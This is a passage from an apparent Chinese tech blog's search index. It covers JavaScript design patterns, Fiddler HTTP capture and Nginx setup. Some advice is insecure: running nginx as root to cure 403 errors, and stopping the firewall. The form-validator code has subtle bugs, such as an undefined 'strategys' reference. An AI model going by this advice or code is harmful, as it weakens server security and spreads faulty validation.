&#x27;老板&#x27;        this.work = [&#x27;喝茶&#x27;, &#x27;开会&#x27;, &#x27;审批文件&#x27;]    &#125;&#125;let coder = new Factory(&#x27;coder&#x27;)console.log(coder)let hr = new Factory(&#x27;hr&#x27;)console.log(hr)\n\n工厂方法关键核心代码是工厂里面的判断this是否属于工厂，也就是做了分支判断，这个工厂只做我能做的产品\n抽象工厂模式上述简单工厂模式和工厂方法模式都是直接生成实例，但是抽象工厂模式不同，抽象工厂模式并不直接生成实例， 而是用于对产品类簇的创建\n通俗点来讲就是：简单工厂和工厂方法模式的工作是生产产品，那么抽象工厂模式的工作就是生产工厂的\n由于JavaScript中并没有抽象类的概念，只能模拟，可以分成四部分：\n\n用于创建抽象类的函数\n抽象类\n具体类\n实例化具体类\n\n上面的例子中有coder、hr、boss、driver四种岗位，其中coder可能使用不同的开发语言进行开发，比如JavaScript、Java等等。那么这两种语言就是对应的类簇\n示例代码如下：\nlet CareerAbstractFactory = function(subType, superType) &#123;  // 判断抽象工厂中是否有该抽象类  if (typeof CareerAbstractFactory[superType] === &#x27;function&#x27;) &#123;    // 缓存类    function F() &#123;&#125;    // 继承父类属性和方法    F.prototype = new CareerAbstractFactory[superType]()    // 将子类的constructor指向父类    subType.constructor = subType;    // 子类原型继承父类    subType.prototype = new F()  &#125; else &#123;    throw new Error(&#x27;抽象类不存在&#x27;)  &#125;&#125;\n\n上面代码中CareerAbstractFactory就是一个抽象工厂方法，该方法在参数中传递子类和父类，在方法体内部实现了子类对父类的继承\n三、应用场景从上面可看到，简单简单工厂的优点就是我们只要传递正确的参数，就能获得所需的对象，而不需要关心其创建的具体细节\n应用场景也容易识别，有构造函数的地方，就应该考虑简单工厂，但是如果函数构建函数太多与复杂，会导致工厂函数变得复杂，所以不适合复杂的情况\n抽象工厂模式一般用于严格要求以面向对象思想进行开发的超大型项目中，我们一般常规的开发的话一般就是简单工厂和工厂方法模式会用的比较多一些\n综上，工厂模式适用场景如下：\n\n如果你不想让某个子系统与较大的那个对象之间形成强耦合，而是想运行时从许多子系统中进行挑选的话，那么工厂模式是一个理想的选择\n将new操作简单封装，遇到new的时候就应该考虑是否用工厂模式；\n需要依赖具体环境创建不同实例，这些实例都有相同的行为,这时候我们可以使用工厂模式，简化实现的过程，同时也可以减少每种对象所需的代码量，有利于消除对象间的耦合，提供更大的灵活性\n\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"设计模式的理解、有哪些","url":"/2019/02/20/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%81%E6%9C%89%E5%93%AA%E4%BA%9B/","content":"一、是什么在软件工程中，设计模式是对软件设计中普遍存在的各种问题所提出的解决方案\n设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案\n设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力\n因此，当我们遇到合适的场景时，我们可能会条件反射一样自然而然想到符合这种场景的设计模式\n比如，当系统中某个接口的结构已经无法满足我们现在的业务需求，但又不能改动这个接口，因为可能原来的系统很多功能都依赖于这个接口，改动接口会牵扯到太多文件\n因此应对这种场景，我们可以很快地想到可以用适配器模式来解决这个问题\n二、有哪些常见的设计模式有：\n\n单例模式\n工厂模式\n策略模式\n代理模式\n中介者模式\n装饰者模式\n……\n\n单例模式保证一个类仅有一个实例，并提供一个访问它的全局访问点。实现的方法为先判断实例存在与否，如果存在则直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象\n如下图的车，只有一辆，一旦借出去则不能再借给别人：\n\n工厂模式工厂模式通常会分成3个角色：\n\n工厂角色-负责实现创建所有实例的内部逻辑.\n抽象产品角色-是所创建的所有对象的父类，负责描述所有实例所共有的公共接口\n具体产品角色-是创建目标，所有创建的对象都充当这个角色的某个具体类的实例\n\n\n策略模式策略模式，就是定义一系列的算法，把他们一个个封装起来，并且使他们可以相互替换\n至少分成两部分：\n\n策略类（可变），策略类封装了具体的算法，并负责具体的计算过程\n环境类（不变），接受客户的请求，随后将请求委托给某一个策略类\n\n代理模式代理模式：为对象提供一个代用品或占位符，以便控制对它的访问\n例如实现图片懒加载的功能，先通过一张loading图占位，然后通过异步的方式加载图片，等图片加载好了再把完成的图片加载到img标签里面\n中介者模式中介者模式的定义：通过一个中介者对象，其他所有的相关对象都通过该中介者对象来通信，而不是相互引用，当其中的一个对象发生改变时，只需要通知中介者对象即可\n通过中介者模式可以解除对象与对象之间的紧耦合关系\n装饰者模式装饰者模式的定义：在不改变对象自身的基础上，在程序运行期间给对象动态地添加方法\n通常运用在原有方法维持不变，在原有方法上再挂载其他方法来满足现有需求\n三、总结不断去学习设计模式，会对我们有着极大的帮助，主要如下：\n\n从许多优秀的软件系统中总结出的成功的、能够实现可维护性、复用的设计方案，使用这些方案将可以让我们避免做一些重复性的工作\n设计模式提供了一套通用的设计词汇和一种通用的形式来方便开发人员之间沟通和交流，使得设计方案更加通俗易懂\n大部分设计模式都兼顾了系统的可重用性和可扩展性，这使得我们可以更好地重用一些已有的设计方案、功能模块甚至一个完整的软件系统，避免我们经常做一些重复的设计、编写一些重复的代码\n合理使用设计模式并对设计模式的使用情况进行文档化，将有助于别人更快地理解系统\n学习设计模式将有助于初学者更加深入地理解面向对象思想\n\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"策略模式","url":"/2019/02/24/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/","content":"一、是什么策略模式（Strategy Pattern）指的是定义一系列的算法，把它们一个个封装起来，目的就是将算法的使用与算法的实现分离开来\n一个基于策略模式的程序至少由两部分组成：\n\n策略类，策略类封装了具体的算法，并负责具体的计算过程\n环境类Context，Context 接受客户的请求，随后 把请求委托给某一个策略类\n\n二、使用举个例子，公司的年终奖是根据员工的工资和绩效来考核的，绩效为A的人，年终奖为工资的4倍，绩效为B的人，年终奖为工资的3倍，绩效为C的人，年终奖为工资的2倍\n若使用if来实现，代码则如下：\nvar calculateBouns = function(salary,level) &#123;    if(level === &#x27;A&#x27;) &#123;        return salary * 4;    &#125;    if(level === &#x27;B&#x27;) &#123;        return salary * 3;    &#125;    if(level === &#x27;C&#x27;) &#123;        return salary * 2;    &#125;&#125;;// 调用如下：console.log(calculateBouns(4000,&#x27;A&#x27;)); // 16000console.log(calculateBouns(2500,&#x27;B&#x27;)); // 7500\n\n从上述可有看到，函数内部包含过多if...else，并且后续改正的时候，需要在函数内部添加逻辑，违反了开放封闭原则\n而如果使用策略模式，就是先定义一系列算法，把它们一个个封装起来，将不变的部分和变化的部分隔开，如下：\nvar obj = &#123;        &quot;A&quot;: function(salary) &#123;            return salary * 4;        &#125;,        &quot;B&quot; : function(salary) &#123;            return salary * 3;        &#125;,        &quot;C&quot; : function(salary) &#123;            return salary * 2;        &#125; &#125;;var calculateBouns =function(level,salary) &#123;    return obj[level](salary);&#125;;console.log(calculateBouns(&#x27;A&#x27;,10000)); // 40000\n\n上述代码中，obj对应的是策略类，而calculateBouns对应上下通信类\n又比如实现一个表单校验的代码，常常会像如下写法：\nvar registerForm = document.getElementById(&quot;registerForm&quot;);registerForm.onsubmit = function()&#123;    if(registerForm.userName.value === &#x27;&#x27;) &#123;        alert(&#x27;用户名不能为空&#x27;);        return;    &#125;    if(registerForm.password.value.length &lt; 6) &#123;        alert(&quot;密码的长度不能小于6位&quot;);        return;    &#125;    if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(registerForm.phoneNumber.value)) &#123;        alert(&quot;手机号码格式不正确&quot;);        return;    &#125;&#125;\n\n上述代码包含多处if语句，并且违反了开放封闭原则，如果应用中还有其他的表单，需要重复编写代码\n此处也可以使用策略模式进行重构校验，第一步确定不变的内容，即策略规则对象，如下：\nvar strategy = &#123;    isNotEmpty: function(value,errorMsg) &#123;        if(value === &#x27;&#x27;) &#123;            return errorMsg;        &#125;    &#125;,    // 限制最小长度    minLength: function(value,length,errorMsg) &#123;        if(value.length &lt; length) &#123;            return errorMsg;        &#125;    &#125;,    // 手机号码格式    mobileFormat: function(value,errorMsg) &#123;        if(!/(^1[3|5|8][0-9]&#123;9&#125;$)/.test(value)) &#123;            return errorMsg;        &#125;    &#125; &#125;;\n\n然后找出变的地方，作为环境类context，负责接收用户的要求并委托给策略规则对象，如下Validator类：\nvar Validator = function()&#123;        this.cache = [];  // 保存效验规则&#125;;Validator.prototype.add = function(dom,rule,errorMsg) &#123;    var str = rule.split(&quot;:&quot;);    this.cache.push(function()&#123;        // str 返回的是 minLength:6         var strategy = str.shift();        str.unshift(dom.value); // 把input的value添加进参数列表        str.push(errorMsg);  // 把errorMsg添加进参数列表        return strategys[strategy].apply(dom,str);    &#125;);&#125;;Validator.prototype.start = function()&#123;    for(var i = 0, validatorFunc; validatorFunc = this.cache[i++]; ) &#123;        var msg = validatorFunc(); // 开始效验 并取得效验后的返回信息        if(msg) &#123;            return msg;        &#125;    &#125;&#125;;\n\n通过validator.add方法添加校验规则和错误信息提示，使用如下：\nvar validateFunc = function()&#123;    var validator = new Validator(); // 创建一个Validator对象    /* 添加一些效验规则 */    validator.add(registerForm.userName,&#x27;isNotEmpty&#x27;,&#x27;用户名不能为空&#x27;);    validator.add(registerForm.password,&#x27;minLength:6&#x27;,&#x27;密码长度不能小于6位&#x27;);    validator.add(registerForm.userName,&#x27;mobileFormat&#x27;,&#x27;手机号码格式不正确&#x27;);    var errorMsg = validator.start(); // 获得效验结果    return errorMsg; // 返回效验结果&#125;;var registerForm = document.getElementById(&quot;registerForm&quot;);registerForm.onsubmit = function()&#123;    var errorMsg = validateFunc();    if(errorMsg)&#123;        alert(errorMsg);        return false;    &#125;&#125;\n\n上述通过策略模式完成表单的验证，并且可以随时调用，在修改表单验证规则的时候，也非常方便，通过传递参数即可调用\n三、应用场景从上面可以看到，使用策略模式的优点有如下：\n\n策略模式利用组合，委托等技术和思想，有效的避免很多if条件语句\n策略模式提供了开放-封闭原则，使代码更容易理解和扩展\n策略模式中的代码可以复用\n\n策略模式不仅仅用来封装算法，在实际开发中，通常会把算法的含义扩散开来，使策略模式也可以用来封装 一系列的“业务规则”\n只要这些业务规则指向的目标一致，并且可以被替换使用，我们就可以用策略模式来封装它们\n","categories":["设计模式"],"tags":["设计模式"]},{"title":"Fiddler 抓包分析","url":"/2021/04/24/%E8%B0%83%E8%AF%95/Fiddler%E6%8A%93%E5%8C%85/","content":"一、Fiddler简介\nFiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器\n\n\n客户端的所有请求都要先经过Fiddler，然后转发到相应的服务器，反之，服务器端的所有响应，也都会先经过Fiddler然后发送到客户端\n使用了Fiddler之后，web客户端和服务器的请求如下所示\n\n\n主界面中主要包括四个常用的块\n\nFiddler的菜单栏，上图绿色部分。包括捕获http请求，停止捕获请求，保存http请求，载入本地session、设置捕获规则等功能。\nFiddler的工具栏,上图红色部分。包括Fiddler针对当前view的操作（暂停，清除session,decode模式、清除缓存等）。\nweb Session面板，上图黄色区域，主要是Fiddler抓取到的每条http请求（每一条称为一个session）,主要包含了请求的url，协议，状态码，body等信息，详细的字段含义如下图所示\n\n\n二、HTTP请求图标说明\n三、Statistic\n关于HTTP请求的性能和其他数据分析\n\n\n\n我们可以从中看出一些基本性能数据：如DNS解析的时间消耗是8ms,建立TCP/IP连接的时间消耗是8ms等等信息\n\n四、Inspectors\n分为上下两个部分，上半部分是请求头部分，下半部分是响应头部分。对于每一部分，提供了多种不同格式查看每个请求和响应的内容。\n\n\nJPG 格式使用 ImageView 就可以看到图片\nHTML&#x2F;JS&#x2F;CSS 使用 TextView可以看到响应的内容。\nRaw标签可以查看原始的符合HTTP标准的请求和响应头。\nAuth则可以查看授权Proxy-Authorization 和 Authorization的相关信息。\nCookies标签可以看到请求的cookie和响应的set-cookie头信息\n\n五、Composer\n老版本的fiddler中叫request-builder.顾名思义，可以构建相应的请求，有两种常用的方式构建请求\n\n\nParsed 输入请求的url之后executed即可，也可以修改相应的头信息（如添加常用的accept,host,referrer,cookie，cache-control等头部）后execute&#96;.\nRaw。使用HTTP头部信息构建http请求。与上类似\n\n六、fiddler过滤会话\n问题：每次使用Fiddler,打开一个网站，都能在Fiddler中看到几十个会话，看得眼花缭乱。\n\n\n期望：只想抓取自己想要的请求\n\n\n七、Response乱码时的处理方法\n问题：有时候我们看到Response中的HTML是乱码的， 这是因为HTML被压缩了， 我们可以通过两种方法去解压缩\n\n\n\n方法二：选中工具栏中的”Decode”。 这样会自动解压缩\n\n\n八、反向代理-AutoResponder\n原理：利用fiddler作為反向代理。意思就是将外界的request请求端口修改掉！ 改写返回数据，最实用的功能\n\n\n用浏览器随意输入一个网址，如http://www.baidu.com/\n选中序号16记录，右击-勾选“Unlock fo Editing”,选择Fiddler右侧reponse块下的TextView，这里修改title,如图：\n\n\n\n选择Fiddler右侧reponse块下的TextView，这里修改title,如图：\n\n\n\n去掉“Unlock for Editing”，再选择右侧上方的AutoResponder,勾选下方的checkbox选框，并将序号16托到下方，同时，里面会多条记录，如下图：\n\n\n\n回到浏览器，刷新页面，如图，标题变为上面改的内容\n\n\n九、fiddler提供了一个功能，让我们模拟低速网路环境\n启用方法如：Rules → Performances → Simulate Modem Speeds\n\n\n十、直接在fiddler上配置host\n点击tools&gt;&gt;hosts,在里面填写自己想要设置的host即可\n\n\n十一、Fiddler显示请求服务器的ip及系统环境的配置方法\n打开Rules——&gt;Customize Rules\n找到如下这段代码\n\nstatic function Main()&#123;var today: Date = new Date();FiddlerObject.StatusText = &quot; CustomRules.js was loaded at: &quot; + today;// Uncomment to add a &quot;Server&quot; column containing the response &quot;Server&quot; header, if present在这一行后面添加如下代码：// 显示服务器web环境FiddlerObject.UI.lvSessions.AddBoundColumn(&quot;Server&quot;, 50, &quot;@response.server&quot;);// 显示服务器IP地址FiddlerObject.UI.lvSessions.AddBoundColumn(&quot;HostIP&quot;, 50, &quot;x-hostIP&quot;);&#125;\n\n\n设置后重启fiddler，效果如下\n\n\n十二、fiddler断点调试\n第一种方法：菜单栏 Rules –》 Automatic Breakpoints –》 Before Requests(请求被发送到服务器端之前)；或者 After Responses(响应返回客户端之前)，这种设置对客户机发出的所有请求都进行拦截\n\n\n十三、配合SwitchySharp插件使用\n为fiddler创建一个规则，代理到本地的8888端口（fiddler所用的端口）google设置代理的方法：下载SwitchySharp插件，设置如下：\n\n\n\n接着点击保存即可~ 这样在需要的时候可以切换到Fiddler\n\n\n","categories":["爬虫"],"tags":["抓包"]},{"title":"Nginx基础配置","url":"/2019/09/24/%E9%83%A8%E7%BD%B2/Nginx%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/","content":"\nNginx 配置文件在线生成: https://nginxconfig.io/\n\nNginx的启动、停止与重启\n建立软连接Nginx到/usr/bin目录下 ln -s /usr/sbin/nginx /usr/bin\n\n启动\n启动代码格式：nginx安装目录地址 -c nginx配置文件地址\n\n[root@LinuxServer sbin]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf\n\n停止\nnginx的停止有三种方式\n\n从容停止\n\n查看进程号 ps -ef|grep nginx\n\n\n\n杀死进程 kill -QUIT 2072\n\n\n快速停止\n\n查看进程号 ps -ef|grep nginx\n\n\n\n杀死进程 kill -TERM 2132 kill -INT 2132\n\n\n\n强制停止 pkill -9 nginx\n\n重启\n\n验证nginx配置文件是否正确\n\n\n方法一：进入nginx安装目录sbin下，输入命令./nginx -t看到如下显示nginx.conf syntax is ok nginx.conf test is successful说明配置文件正确\n\n\n\n方法二：在启动命令-c前加-t\n\n\n重启Nginx服务\n\n方法一：进入nginx可执行目录sbin下，输入命令./nginx -s reload即可\n\n\n\n方法二：查找当前nginx进程号，然后输入命令：kill -HUP 进程号 实现重启nginx服务\n\n\nNginx基础配置\n在Nginx目录下的vhost或conf.d目录下新建一个配置文件（如poetries-80.conf）\n把server的内容配置进去\n在Nginx.conf中的http下include配置文件\n检测配置文件是否出错 切换到/etc/nginx下 nginx -t\n重新加载配置文件 nginx -c /usr/local/etc/nginx/nginx.conf\n在重启Nginx nginx -s reload\n\nuser  root;  //Nginx需要有有一个用户worker_processes  2; // Nginx进程数 最大1024pid        conf/nginx.pid; worker_rlimit_nofile 2048;events &#123;    use epoll;    worker_connections  2048;&#125;http &#123; \tserver &#123;       listen       80;       server_name  119.29.145.252;\t          location / &#123;           root   /usr/local/nginx/html;           index  index.html index.htm;        &#125;   &#125;   server &#123;       listen       3001;       server_name  119.29.145.252;\t          location / &#123;           root   /usr/local/nginx/book;           index  index.html index.htm;        &#125;   &#125;   server &#123;       listen       9000;       server_name  119.29.145.252;\t          location / &#123;           root   /usr/local/nginx/vue;           index  index.html index.htm;        &#125;   &#125;&#125;\n\n一些错误nginx: [error] invalid PID number “” in “/usr/local/var/run/nginx/nginx.pid”\n\n\n解决办法：nginx -c /usr/local/etc/nginx/nginx.conf\nnginx -s reload\n\n权限问题导致Nginx 403 Forbidden错误的解决方法\n\n在nginx.conf头部加入一行 user root;\n重启nginx再访问，就可以正常访问了\n\n","categories":["liunx"],"tags":["nginx"]},{"title":"Nginx学习","url":"/2019/08/30/%E9%83%A8%E7%BD%B2/Nginx%E5%AD%A6%E4%B9%A0/","content":"\nNginx 配置文件在线生成: https://nginxconfig.io/\n\n\nNginx 是一款面向性能设计的 HTTP 服务器，能反向代理 HTTP，HTTPS 和邮件相关(SMTP，POP3，IMAP)的协议链接。并且提供了负载均衡以及 HTTP 缓存。它的设计充分使用异步事件模型，削减上下文调度的开销，提高服务器并发能力。采用了模块化设计，提供了丰富模块的第三方模块。\n\n\n所以关于 &#96;Nginx，有这些标签：「异步」「事件」「模块化」「高性能」「高并发」「反向代理」「负载均衡」\n\n一、安装1.1 安装依赖\nprce(重定向支持)和openssl(https支持，如果不需要https可以不安装)\n\nyum install -y pcre-devel yum -y install gcc make gcc-c++ wgetyum -y install openssl openssl-devel\n\nCentOS 6.5 我安装的时候是选择的“基本服务器”，默认这两个包都没安装全，所以这两个都运行安装即可\n1.2 下载nginx的所有版本在这里\nwget http://nginx.org/download/nginx-1.13.3.tar.gzwget http://nginx.org/download/nginx-1.13.7.tar.gz# 如果没有安装wget# 下载已编译版本$ yum install wget# 解压压缩包tar zxf nginx-1.13.3.tar.gz\n\n1.3 编译安装然后进入目录编译安装，configure参数说明\ncd nginx-1.11.5./configure....Configuration summary  + using system PCRE library  + OpenSSL library is not used  + using system zlib library  nginx path prefix: &quot;/usr/local/nginx&quot;  nginx binary file: &quot;/usr/local/nginx/sbin/nginx&quot;  nginx modules path: &quot;/usr/local/nginx/modules&quot;  nginx configuration prefix: &quot;/usr/local/nginx/conf&quot;  nginx configuration file: &quot;/usr/local/nginx/conf/nginx.conf&quot;  nginx pid file: &quot;/usr/local/nginx/logs/nginx.pid&quot;  nginx error log file: &quot;/usr/local/nginx/logs/error.log&quot;  nginx http access log file: &quot;/usr/local/nginx/logs/access.log&quot;  nginx http client request body temporary files: &quot;client_body_temp&quot;  nginx http proxy temporary files: &quot;proxy_temp&quot;  nginx http fastcgi temporary files: &quot;fastcgi_temp&quot;  nginx http uwsgi temporary files: &quot;uwsgi_temp&quot;  nginx http scgi temporary files: &quot;scgi_temp&quot;\n\n\n安装报错误的话比如：“C compiler cc is not found”，这个就是缺少编译环境，安装一下就可以了 yum -y install gcc make gcc-c++ openssl-devel\n\n如果没有error信息，就可以执行下边的安装了：\nmakemake install\n\n1.4 nginx测试\n运行下面命令会出现两个结果，一般情况nginx会安装在/usr/local/nginx目录中\n\ncd /usr/local/nginx/sbin/./nginx -t# nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful\n\n1.5 设置全局nginx命令vi ~/.bash_profile\n\n将下面内容添加到 ~/.bash_profile 文件中\nPATH=$PATH:$HOME/bin:/usr/local/nginx/sbin/export PATH\n\n运行命令 source ~/.bash_profile 让配置立即生效。你就可以全局运行 nginx 命令了。\n二、开机自启动开机自启动方法一\n\n编辑 vi /lib/systemd/system/nginx.service 文件，没有创建一个 touch nginx.service - 然后将如下内容根据具体情况进行修改后，添加到nginx.service文件中：\n\n[Unit]Description=nginxAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/var/run/nginx.pidExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.confExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target[Unit]:服务的说明  Description:描述服务  After:描述服务类别  [Service]服务运行参数的设置  Type=forking是后台运行的形式  ExecStart为服务的具体运行命令  ExecReload为重启命令  ExecStop为停止命令  PrivateTmp=True表示给服务分配独立的临时空间  注意：[Service]的启动、重启、停止命令全部要求使用绝对路径  [Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3\n\n保存退出。\n设置开机启动，使配置生效：\nsystemctl enable nginx.service# 输出下面内容表示成功了Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service.\n\n开机自启动方法二\nvi /etc/rc.local# 在 rc.local 文件中，添加下面这条命令/usr/local/nginx/sbin/nginx start\n\n\n如果开机后发现自启动脚本没有执行，你要去确认一下rc.local这个文件的访问权限是否是可执行的，因为rc.local默认是不可执行的。修改rc.local访问权限，增加可执行权限：\n\nchmod +x /etc/rc.d/rc.local\n\n三、运维3.1 服务管理# 启动/usr/local/nginx/sbin/nginx# 重启/usr/local/nginx/sbin/nginx -s reload# 关闭进程/usr/local/nginx/sbin/nginx -s stop# 平滑关闭nginx/usr/local/nginx/sbin/nginx -s quit# 查看nginx的安装状态，/usr/local/nginx/sbin/nginx -V\n\n关闭防火墙，或者添加防火墙规则就可以测试了\nservice iptables stop\n\n或者编辑配置文件：\nvi /etc/sysconfig/iptables\n\n添加这样一条开放80端口的规则后保存：\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT\n\n重启服务即可:\nservice iptables restart# 命令进行查看目前natiptables -t nat -L\n\n3.2 重启服务防火墙报错解决service iptables restart# Redirecting to /bin/systemctl restart  iptables.service# Failed to restart iptables.service: Unit iptables.service failed to load: No such file or directory.\n\n\n在CentOS 7或RHEL 7或Fedora中防火墙由 firewalld 来管理，当然你可以还原传统的管理方式。或则使用新的命令进行管理。假如采用传统请执行一下命令\n\n# 传统命令systemctl stop firewalldsystemctl mask firewalld# 安装命令yum install iptables-servicessystemctl enable iptables service iptables restart\n\n四、nginx卸载\n如果通过yum安装，使用下面命令安装。\n\nyum remove nginx\n\n\n编译安装，删除/usr/local/nginx目录即可\n如果配置了自启动脚本，也需要删除。\n\n五、参数说明\n\n\n参数\n说明\n\n\n\n–prefix&#x3D;&#96;&#96;\nNginx安装路径。如果没有指定，默认为 &#x2F;usr&#x2F;local&#x2F;nginx。\n\n\n–sbin-path&#x3D;&#96;&#96;\nNginx可执行文件安装路径。只能安装时指定，如果没有指定，默认为&#96;&#96;&#x2F;sbin&#x2F;nginx。\n\n\n–conf-path&#x3D;&#96;&#96;\n在没有给定-c选项下默认的nginx.conf的路径。如果没有指定，默认为&#96;&#96;&#x2F;conf&#x2F;nginx.conf。\n\n\n–pid-path&#x3D;&#96;&#96;\n在nginx.conf中没有指定pid指令的情况下，默认的nginx.pid的路径。如果没有指定，默认为 &#96;&#96;&#x2F;logs&#x2F;nginx.pid。\n\n\n–lock-path&#x3D;&#96;&#96;\nnginx.lock文件的路径。\n\n\n–error-log-path&#x3D;&#96;&#96;\n在nginx.conf中没有指定error_log指令的情况下，默认的错误日志的路径。如果没有指定，默认为 &#96;&#96;&#x2F;- logs&#x2F;error.log。\n\n\n–http-log-path&#x3D;&#96;&#96;\n在nginx.conf中没有指定access_log指令的情况下，默认的访问日志的路径。如果没有指定，默认为 &#96;&#96;&#x2F;- logs&#x2F;access.log。\n\n\n–user&#x3D;&#96;&#96;\n在nginx.conf中没有指定user指令的情况下，默认的nginx使用的用户。如果没有指定，默认为 nobody。\n\n\n–group&#x3D;&#96;&#96;\n在nginx.conf中没有指定user指令的情况下，默认的nginx使用的组。如果没有指定，默认为 nobody。\n\n\n–builddir&#x3D;DIR\n指定编译的目录\n\n\n–with-rtsig_module\n启用 rtsig 模块\n\n\n–with-select_module –without-select_module\n允许或不允许开启SELECT模式，如果 configure 没有找到更合适的模式，比如：kqueue(sun os),epoll (linux kenel 2.6+), rtsig(- 实时信号)或者&#x2F;dev&#x2F;poll(一种类似select的模式，底层实现与SELECT基本相 同，都是采用轮训方法) SELECT模式将是默认安装模式\n\n\n–with-poll_module –without-poll_module\nWhether or not to enable the poll module. This module is enabled by, default if a more suitable method such as kqueue, epoll, rtsig or &#x2F;dev&#x2F;poll is not discovered by configure.\n\n\n–with-http_ssl_module\nEnable ngx_http_ssl_module. Enables SSL support and the ability to handle HTTPS requests. Requires OpenSSL. On Debian, this is libssl-dev. 开启HTTP SSL模块，使NGINX可以支持HTTPS请求。这个模块需要已经安装了OPENSSL，在DEBIAN上是libssl\n\n\n–with-http_realip_module\n启用 ngx_http_realip_module\n\n\n–with-http_addition_module\n启用 ngx_http_addition_module\n\n\n–with-http_sub_module\n启用 ngx_http_sub_module\n\n\n–with-http_dav_module\n启用 ngx_http_dav_module\n\n\n–with-http_flv_module\n启用 ngx_http_flv_module\n\n\n–with-http_stub_status_module\n启用 “server status” 页\n\n\n–without-http_charset_module\n禁用 ngx_http_charset_module\n\n\n–without-http_gzip_module\n禁用 ngx_http_gzip_module. 如果启用，需要 zlib 。\n\n\n–without-http_ssi_module\n禁用 ngx_http_ssi_module\n\n\n–without-http_userid_module\n禁用 ngx_http_userid_module\n\n\n–without-http_access_module\n禁用 ngx_http_access_module\n\n\n–without-http_auth_basic_module\n禁用 ngx_http_auth_basic_module\n\n\n–without-http_autoindex_module\n禁用 ngx_http_autoindex_module\n\n\n–without-http_geo_module\n禁用 ngx_http_geo_module\n\n\n–without-http_map_module\n禁用 ngx_http_map_module\n\n\n–without-http_referer_module\n禁用 ngx_http_referer_module\n\n\n–without-http_rewrite_module\n禁用 ngx_http_rewrite_module. 如果启用需要 PCRE 。\n\n\n–without-http_proxy_module\n禁用 ngx_http_proxy_module\n\n\n–without-http_fastcgi_module\n禁用 ngx_http_fastcgi_module\n\n\n–without-http_memcached_module\n禁用 ngx_http_memcached_module\n\n\n–without-http_limit_zone_module\n禁用 ngx_http_limit_zone_module\n\n\n–without-http_empty_gif_module\n禁用 ngx_http_empty_gif_module\n\n\n–without-http_browser_module\n禁用 ngx_http_browser_module\n\n\n–without-http_upstream_ip_hash_module\n禁用 ngx_http_upstream_ip_hash_module\n\n\n–with-http_perl_module\n启用 ngx_http_perl_module\n\n\n–with-perl_modules_path&#x3D;PATH\n指定 perl 模块的路径\n\n\n–with-perl&#x3D;PATH\n指定 perl 执行文件的路径\n\n\n–http-log-path&#x3D;PATH\nSet path to the http access log\n\n\n–http-client-body-temp-path&#x3D;PATH\nSet path to the http client request body temporary files\n\n\n–http-proxy-temp-path&#x3D;PATH\nSet path to the http proxy temporary files\n\n\n–http-fastcgi-temp-path&#x3D;PATH\nSet path to the http fastcgi temporary files\n\n\n–without-http\n禁用 HTTP server\n\n\n–with-mail\n启用 IMAP4&#x2F;POP3&#x2F;SMTP 代理模块\n\n\n–with-mail_ssl_module\n启用 ngx_mail_ssl_module\n\n\n–with-cc&#x3D;PATH\n指定 C 编译器的路径\n\n\n–with-cpp&#x3D;PATH\n指定 C 预处理器的路径\n\n\n–with-cc-opt&#x3D;OPTIONS\nAdditional parameters which will be added to the variable CFLAGS. With the use of the system library PCRE in FreeBSD, it is necessary to indicate –with-cc-opt&#x3D;”-I &#x2F;usr&#x2F;local&#x2F;include”. If we are using select() and it is necessary to increase the number of file descriptors, then this also can be assigned here: –with-cc-opt&#x3D;”-D FD_SETSIZE&#x3D;2048”.\n\n\n–with-ld-opt&#x3D;OPTIONS\nAdditional parameters passed to the linker. With the use of the system library PCRE in - FreeBSD, it is necessary to indicate –with-ld-opt&#x3D;”-L &#x2F;usr&#x2F;local&#x2F;lib”.\n\n\n–with-cpu-opt&#x3D;CPU\n为特定的 CPU 编译，有效的值包括：pentium, pentiumpro, pentium3, pentium4, athlon, opteron, amd64, sparc32, sparc64, ppc64\n\n\n–without-pcre\n禁止 PCRE 库的使用。同时也会禁止 HTTP rewrite 模块。在 “location” 配置指令中的正则表达式也需要 PCRE 。\n\n\n–with-pcre&#x3D;DIR\n指定 PCRE 库的源代码的路径。\n\n\n–with-pcre-opt&#x3D;OPTIONS\nSet additional options for PCRE building.\n\n\n–with-md5&#x3D;DIR\nSet path to md5 library sources.\n\n\n–with-md5-opt&#x3D;OPTIONS\nSet additional options for md5 building.\n\n\n–with-md5-asm\nUse md5 assembler sources.\n\n\n–with-sha1&#x3D;DIR\nSet path to sha1 library sources.\n\n\n–with-sha1-opt&#x3D;OPTIONS\nSet additional options for sha1 building.\n\n\n–with-sha1-asm\nUse sha1 assembler sources.\n\n\n–with-zlib&#x3D;DIR\nSet path to zlib library sources.\n\n\n–with-zlib-opt&#x3D;OPTIONS\nSet additional options for zlib building.\n\n\n–with-zlib-asm&#x3D;CPU\nUse zlib assembler sources optimized for specified CPU, valid values are: 